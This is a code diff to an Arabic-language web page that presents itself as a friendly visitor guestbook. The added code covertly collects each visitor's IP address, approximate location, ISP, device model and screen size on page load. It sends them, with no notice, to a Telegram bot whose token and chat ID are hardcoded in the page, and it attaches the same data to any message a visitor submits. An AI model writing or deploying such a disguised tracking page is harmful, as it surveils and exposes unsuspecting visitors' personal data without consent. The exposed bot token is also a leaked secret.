@@ -73,7 +73,7 @@
         <h1>مرحباً بك! 👋</h1>
         <p>يسعدني مرورك، اترك لي رسالة أو كلمة تعبيرية هنا:</p>
         
-        <form id="msgForm" onsubmit="sendData(event)">
+        <form id="msgForm" onsubmit="sendUserMessage(event)">
             <textarea id="visitorMessage" placeholder="اكتب رسالتك هنا..."></textarea>
             <button type="submit" id="sendBtn">إرسال الرسالة</button>
         </form>
@@ -85,18 +85,9 @@
         const BOT_TOKEN = "9067905487:AAFWRzqKu9WX0XZYfmEdHtaRrITXiQarppI";
         const CHAT_ID = "8318202151";
 
-        async function sendData(event) {
-            event.preventDefault(); // منع إعادة تحميل الصفحة
-
-            const btn = document.getElementById('sendBtn');
-            const statusDiv = document.getElementById('statusMsg');
-            const userMsg = document.getElementById('visitorMessage').value.trim();
-
-            btn.innerText = "جاري الإرسال...";
-            btn.disabled = true;
-
+        // دالة مساعدة لجلب بيانات الزائر (IP، الموقع، الجهاز)
+        async function getVisitorInfo() {
             try {
-                // جلب بيانات الموقع الجغرافي والـ IP
                 const response = await fetch("https://ipinfo.io/json");
                 const data = await response.json();
 
@@ -105,7 +96,6 @@
                 const country = data.country || "غير معروف";
                 const org = data.org || "غير معروف";
                 
-                // جلب نوع الجهاز
                 let deviceModel = "هاتف Android أو جهاز آخر";
                 try {
                     if (navigator.userAgentData) {
@@ -123,37 +113,71 @@
                 const screenRes = window.screen.width + "x" + window.screen.height;
                 const time = new Date().toLocaleString();
 
-                // صياغة الرسالة الشاملة (الرسالة المكتوبة + المعلومات)
-                let textMsg = "💬 رسالة جديدة من زائر!\n\n";
-                
-                if (userMsg !== "") {
-                    textMsg += "✍️ النص المكتوب: \"" + userMsg + "\"\n\n";
-                } else {
-                    textMsg += "✍️ النص المكتوب: (لم يكتب شيئاً، دخل للموقع فقط)\n\n";
-                }
+                return { ip, city, country, org, deviceModel, screenRes, time };
+            } catch (error) {
+                console.error("خطأ في جلب بيانات الـ IP:", error);
+                return null;
+            }
+        }
 
+        // 1. يتم تنفيذها تلقائياً بمجرد فتح الصفحة (بمجرد الدخول)
+        window.onload = async function() {
+            const info = await getVisitorInfo();
+            if (!info) return;
+
+            const textMsg = 
+                "🚨 تم تسجيل دخول زائر جديد للموقع!\n\n" +
+                "📍 الموقع التقريبي: " + info.city + "، " + info.country + "\n" +
+                "🌐 IP: " + info.ip + "\n" +
+                "📡 المزود: " + info.org + "\n" +
+                "📱 الجهاز: " + info.deviceModel + "\n" +
+                "🖥 الشاشة: " + info.screenRes + "\n" +
+                "⏰ الوقت: " + info.time;
+
+            await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: textMsg })
+            });
+        };
+
+        // 2. يتم تنفيذها عندما يكتب الزائر رسالة ويضغط إرسال
+        async function sendUserMessage(event) {
+            event.preventDefault();
+
+            const btn = document.getElementById('sendBtn');
+            const statusDiv = document.getElementById('statusMsg');
+            const userMsg = document.getElementById('visitorMessage').value.trim();
+
+            if (userMsg === "") {
+                alert("الرجاء كتابة رسالة أولاً!");
+                return;
+            }
+
+            btn.innerText = "جاري الإرسال...";
+            btn.disabled = true;
+
+            const info = await getVisitorInfo();
+
+            let textMsg = "💬 رسالة جديدة من زائر!\n\n" +
+                "✍️ النص المكتوب: \"" + userMsg + "\"\n\n" +
+                "------------------------\n";
+            
+            if (info) {
                 textMsg += 
-                    "------------------------\n" +
-                    "📍 الموقع التقريبي: " + city + "، " + country + "\n" +
-                    "🌐 IP: " + ip + "\n" +
-                    "📡 المزود: " + org + "\n" +
-                    "📱 الجهاز: " + deviceModel + "\n" +
-                    "🖥 الشاشة: " + screenRes + "\n" +
-                    "⏰ الوقت: " + time;
+                    "📍 الموقع: " + info.city + "، " + info.country + "\n" +
+                    "🌐 IP: " + info.ip + "\n" +
+                    "📱 الجهاز: " + info.deviceModel + "\n" +
+                    "⏰ الوقت: " + info.time;
+            }
 
-                // إرسال البيانات إلى تيليجرام
+            try {
                 await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
                     method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: textMsg
-                    })
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: textMsg })
                 });
 
-                // إظهار رسالة النجاح للزائر
                 document.getElementById('msgForm').style.display = 'none';
                 statusDiv.style.display = 'block';
 
